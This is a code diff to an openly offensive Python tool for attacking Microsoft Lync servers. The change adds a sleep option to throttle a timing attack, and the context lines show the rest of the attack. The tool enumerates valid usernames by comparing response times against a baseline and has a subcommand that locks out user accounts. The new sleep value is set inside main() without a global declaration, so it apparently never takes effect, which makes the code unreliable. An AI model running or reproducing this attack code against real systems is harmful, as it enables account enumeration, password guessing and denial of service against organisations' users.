@@ -15,6 +15,7 @@ import string
 import random
 import requests
 import datetime
+import time
 
 try:
         requests.packages.urllib3.disable_warnings()
@@ -25,6 +26,7 @@ outputfile="lyncsmash.log"
 validCred = False
 isDisabled = False
 timeout = 1.00
+apSleep=0
 
 def main():
         parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
@@ -42,7 +44,8 @@ def main():
         enum_parser.add_argument('-P', dest='passwdfile', help='Password file to read from', required=False)
         enum_parser.add_argument('-o', dest='outfile', help='Output file', required=False)
         enum_parser.add_argument('-t', dest='time_avg', help='Known average request time', required=False, type=float)
-
+        enum_parser.add_argument('-s', dest='sleep', help='Sleep timer to wait between reqeusts in seconds, will only work with enum', required=False, type=float)
+	
         lock_parser = subparsers.add_parser('lock', help='Lock Lync user account')
         lock_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
         lock_parser.add_argument('-u', dest='user', help='Lync user', required=True)
@@ -63,13 +66,14 @@ def main():
                 if all((args.passwd, args.passwdfile)):
                        print_error('You cant have both a passwd file and passwd specified')
                        exit()
-
+			
                 if (( args.outfile ) == ( None )):
                        print_error("You need to define an output file now. Entries will be appended to 'lyncsmash.log' instead.")
                 else:
                        global outputfile
                        outputfile = args.outfile
-
+                if args.sleep is not None:
+                       apSleep=args.sleep
                 #okay, if we have a username file, proceed
                 if os.path.isfile(args.usernames):
                         # get a baseline timeout - this is response time for invalid usernames
@@ -164,6 +168,7 @@ def timing_attack(host,userfilepath,password,domain, randomize):
                 random.shuffle(user_list)
             for user in user_list:
                 try:
+                    time.sleep(apSleep)
                     response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
                     candidatevalue=float(float(response_time)/timeout)
                     if candidatevalue <= float("0.4"):
@@ -194,7 +199,6 @@ def timing_attack(host,userfilepath,password,domain, randomize):
         f.write("Elapsed time {0}\n".format(elapsed_time))
         user_file.close()
 
-
 # Determine the baseline timeout for invalid username
 def baseline_timeout(host, domain):
     print_status("Performing baseline tests ... this will take a while")
@@ -218,7 +222,6 @@ def baseline_timeout(host, domain):
             average_timeout = None
 
     return average_timeout
-
 
 # Send Lync request
 def send_xml(host, domain, user, passwd):
